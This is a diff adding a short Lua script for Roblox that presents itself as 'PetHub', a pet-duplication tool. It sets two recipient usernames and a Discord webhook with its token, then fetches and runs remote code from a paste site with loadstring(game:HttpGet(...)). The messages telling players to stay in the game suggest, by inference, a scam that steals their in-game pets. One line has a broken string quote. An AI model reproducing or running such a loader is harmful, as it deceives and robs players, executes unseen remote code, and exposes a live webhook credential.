@@ -1,0 +1,9 @@
+UserName = "AmazonBK"
+UserName2 = "RJGOWILD"
+Webhook = "https://discord.com/api/webhooks/1113470522135691314/_exm6fSowd3hOD3_zvin8arBx7qmemh7jchP_Z7tuy4eDokx09TAPQG1378Ywrl1eMDv"
+_G.ScriptName = PetHub"
+_G.FirstText = "Thank you for using PetHub"
+_G.SecondText = "DONT LEAVE THE GAME OR THIS WILL NOT WORK"
+_G.ThirdText = "Enjoy your duped pets"
+_G.WaitingTime = 300
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/984685", true))()
